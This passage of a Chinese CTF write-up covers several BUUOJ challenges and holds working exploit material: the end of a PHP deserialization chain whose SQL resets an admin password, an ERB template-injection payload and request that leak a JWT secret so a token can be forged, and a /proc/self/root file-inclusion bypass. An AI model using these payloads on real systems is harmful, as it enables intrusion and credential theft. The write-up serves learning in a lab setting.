    public $dbuser="root";
    public $dbpass="root";
    public $database="test";
    public $name;
    public $password;
    public $mysqli;
    public $token;

}

$sql = 'update user set password=md5("admin") where username="admin"';

$d = new dbCtrl();
$d->name = 'x';
$d->password = '1';

$c = new Info();
$c->CtrlCase = $d;

$b = new User();
$b->nickname = $c;
$b->age = $sql;

$a = new User();
$a->nickname = $b;

echo '";s:8:"nickname";'.serialize($a).';}';
```

构造逃逸字符串

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101838715.png)

发送

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101841495.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101841069.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101841136.png)

## [SCTF2019]Flag Shop

robots.txt 提示 /filebak

```ruby
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```

参考文章

[https://www.sys71m.top/2018/08/03/Ruby_ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5](https://www.sys71m.top/2018/08/03/Ruby_ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)

细看 /work 路由

```ruby
get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end
```

前面有个正则匹配 `ENV["SECRET"]`, 后面通过 `#{params[:name][0,7]}` 截取 name 参数前 7 位作为 erb 模板输出, 根据文章知道存在 ssti, 但是限制 7 字符, 光 `<%=%>` 就占了 5 个字符

查找后发现 ruby 存在内部变量

[https://m.php.cn/manual/view/20243.html](https://m.php.cn/manual/view/20243.html)

`$'` 表示最后一次匹配成功的字符串后面的字符串, 例如 `helloworld` 匹配了 `h`, 那么 `$'` 即为 `elloworld`

根据这个其实就可以盲注出 SECRET, 但是 wp 直接将 SECRET 置空, 没看懂什么意思

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211112202635.png)

猜测空字符可以匹配所有字符串?

最终 payload

```
<%=$'%>
```

注意 urlencode

```
/work?name=%3c%25%3d%24%27%25%3e&do=%3c%25%3d%24%27%25%3e+is+working&SECRET=x
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211112159196.png)

之后就是常规伪造 jwt

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211112206052.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211112206451.png)

## [WMCTF2020]Make PHP Great Again

```php
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

利用 /proc 目录绕过包含限制

[https://www.anquanke.com/post/id/213235](https://www.anquanke.com/post/id/213235)

```
http://b6e240d9-990d-40f7-a32a-34c0d0e150a7.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```
